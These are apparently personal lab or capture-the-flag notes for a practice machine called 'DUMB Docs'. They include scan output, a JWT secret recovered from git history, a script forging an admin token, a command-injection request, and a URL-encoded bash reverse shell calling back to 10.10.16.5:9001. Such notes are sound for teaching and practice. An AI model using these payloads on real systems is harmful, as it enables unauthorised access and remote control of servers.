## 10.10.11.120

#### nmap
```
╰─ sudo nmap -T4 10.10.11.120 -p22,80,3000 -A -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-18 12:16 EDT
Nmap scan report for 10.10.11.120
Host is up (0.014s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   18.81 ms 10.10.16.1
2   10.24 ms 10.10.11.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.35 seconds

```

#### gobuster port 80
```
─ gobuster dir -u http://10.10.11.120 -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.120
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/18 12:20:16 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 301) [Size: 183] [--> /download/]
/docs                 (Status: 200) [Size: 20720]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/api                  (Status: 200) [Size: 93]
/Docs                 (Status: 200) [Size: 20720]
/API                  (Status: 200) [Size: 93]
/DOCS                 (Status: 200) [Size: 20720]
Progress: 220431 / 220561 (99.94%)
===============================================================
2023/06/18 12:25:36 Finished
===============================================================
```

#### secret from git log
```
gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

#### token
```
email: fake@fake.com
password: password

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDhmYWVmNTk2NzM1YjA0NWE5NjYwNDkiLCJuYW1lIjoid2FsbHkxIiwiZW1haWwiOiJmYWtlQGZha2UuY29tIiwiaWF0IjoxNjg3MTM4MDczfQ.GxuEKqTq4TZ8IL3Bx7Ji2nTV8ty1pDkD_j45RcK8zEQ
```

#### token decode/encode
``` python
import jwt
token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDhmYWVmNTk2NzM1YjA0NWE5NjYwNDkiLCJuYW1lIjoid2FsbHkxIiwiZW1haWwiOiJmYWtlQGZha2UuY29tIiwiaWF0IjoxNjg3MTM4MDczfQ.GxuEKqTq4TZ8IL3Bx7Ji2nTV8ty1pDkD_j45RcK8zEQ
secret = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE

j = jwt.decode(token, secret)
j['name'] = 'theadmin'
jwt.encode(j, secret, options={"verify_signature": False})
```


#### burp command injection request
```
GET /api/logs?file=;+id HTTP/1.1
Host: 10.10.11.120
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Content-Type: application/json; charset=utf-8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 8
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDhmYWVmNTk2NzM1YjA0NWE5NjYwNDkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImZha2VAZmFrZS5jb20iLCJpYXQiOjE2ODcxMzgwNzN9.zUnweNXJn1Vfc-yGmJH9gKkWNTHbggnrS_EowE8gCtk

{

}

```

#### burp reverse shell
```
GET /api/logs?file=/dev/null;+bash+-c+'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.5%2F9001%200%3E%261' HTTP/1.1
```

#### next steps
`/opt/count` has SUID bit set and has a c source file `code.c`